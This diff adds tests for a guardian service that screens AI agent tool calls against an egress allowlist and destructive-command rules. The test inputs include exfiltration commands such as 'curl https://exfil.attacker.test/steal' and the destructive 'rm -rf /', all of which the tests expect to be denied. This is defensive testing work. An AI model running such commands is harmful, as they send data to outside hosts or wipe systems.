@@ -12,7 +12,7 @@ import {
   loadSessionContext,
   supplySourceLabels,
 } from "../src/index.ts";
-import { toRepoRelativeMessage } from "../src/server.ts";
+import { dispatchGuardianAnnotator, toRepoRelativeMessage } from "../src/server.ts";
 import type { AcsFinalResult } from "../src/acs-result.ts";
 
 const HANDSHAKE_SCHEMA_PATH = "spec/acs/specification/v0.1.0/handshake.json";
@@ -1418,6 +1418,119 @@ describe("a redaction lands on the argument the tool actually sent", () => {
     try {
       const decision = await postToolCallRequest(guardian, "Bash", { command: "echo ghp_ABCDEF123456" });
       expect(decision.modifications).toEqual({ parameter_overrides: { command: "echo [REDACTED]" } });
+    } finally {
+      await guardian.close();
+    }
+  });
+});
+
+describe("the annotator the shipped manifest declares", () => {
+  it("routes the egress annotator by name", () => {
+    expect(
+      dispatchGuardianAnnotator("egress", {}, { snapshot: { tool_call: { args: {}, raw_command: "curl https://exfil.test/x" } } }),
+    ).toEqual({ destination: "https://exfil.test/x" });
+  });
+
+  // A manifest naming an annotator this Guardian has nothing for is a
+  // deployment fault, and AGT turns the throw into a deny on every call --
+  // which is exactly right, because it is wrong on every call. Answering an
+  // empty annotation instead would run the deployment silently unannotated.
+  it("refuses a name it has no annotator for, rather than answering nothing", () => {
+    expect(() => dispatchGuardianAnnotator("drift_score", {}, {})).toThrow(/drift_score/);
+  });
+});
+
+// THE ONE CHECK IN THIS SLICE WHOSE ABSENCE WOULD BE SILENT. A manifest
+// declaring an annotator the Guardian dispatches nothing for denies every
+// call, benign ones included, with a runtime-error reason that reads like a
+// policy decision -- measured. Nothing else here would catch that: every
+// deny-side test in this slice would still pass.
+describe("a benign call under the shipped manifest and the shipped annotator", () => {
+  it("is not denied", async () => {
+    const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
+    try {
+      const decision = await postToolCallRequest(guardian, "Bash", { command: "echo hi" }, { raw_command: "echo hi" });
+      expect(decision.decision).toBe("allow");
+      expect(decision.reason_codes ?? []).not.toContain("runtime_error:annotation_failed");
+    } finally {
+      await guardian.close();
+    }
+  });
+});
+
+describe("AGT's stock egress gate, driven from configuration", () => {
+  it("denies a fetch of a host the allowlist does not cover", async () => {
+    const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
+    try {
+      const decision = await postToolCallRequest(guardian, "WebFetch", { url: "https://exfil.attacker.test/steal" });
+      expect(decision.decision).toBe("deny");
+      expect(decision.reason_codes).toEqual(["egress_destination_not_allowed"]);
+    } finally {
+      await guardian.close();
+    }
+  });
+
+  it("allows a fetch the allowlist covers", async () => {
+    const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
+    try {
+      expect((await postToolCallRequest(guardian, "WebFetch", { url: "https://docs.anthropic.com/x" })).decision).toBe("allow");
+    } finally {
+      await guardian.close();
+    }
+  });
+
+  it("denies a shell command reaching the same host, from a destination the Guardian extracted", async () => {
+    const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
+    try {
+      const decision = await postToolCallRequest(
+        guardian,
+        "Bash",
+        { command: "curl https://exfil.attacker.test/steal" },
+        { raw_command: "curl https://exfil.attacker.test/steal" },
+      );
+      expect(decision.decision).toBe("deny");
+      expect(decision.reason_codes).toEqual(["egress_destination_not_allowed"]);
+    } finally {
+      await guardian.close();
+    }
+  });
+
+  // No false positive in either direction, which is what makes a SHARED
+  // policy-target leaf safe: the destructive-shell patterns do not match URLs,
+  // and the egress gate does not match commands.
+  it("still denies a destructive shell command on its own gate, not on this one", async () => {
+    const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
+    try {
+      const decision = await postToolCallRequest(guardian, "Bash", { command: "rm -rf /" }, { raw_command: "rm -rf /" });
+      expect(decision.reason_codes).toEqual(["destructive_shell_command_blocked"]);
+    } finally {
+      await guardian.close();
+    }
+  });
+
+  it("allows a shell command reaching a host the allowlist covers", async () => {
+    const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
+    try {
+      const decision = await postToolCallRequest(
+        guardian,
+        "Bash",
+        { command: "curl https://docs.anthropic.com/x" },
+        { raw_command: "curl https://docs.anthropic.com/x" },
+      );
+      expect(decision.decision).toBe("allow");
+    } finally {
+      await guardian.close();
+    }
+  });
+
+  // The stated miss direction, at the level a demo viewer sees it: a command
+  // the extractor cannot parse is unexamined, not denied.
+  it("allows a command it can find no destination in, rather than denying what it cannot read", async () => {
+    const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
+    try {
+      expect(
+        (await postToolCallRequest(guardian, "Bash", { command: "echo hi" }, { raw_command: "echo hi" })).decision,
+      ).toBe("allow");
     } finally {
       await guardian.close();
     }
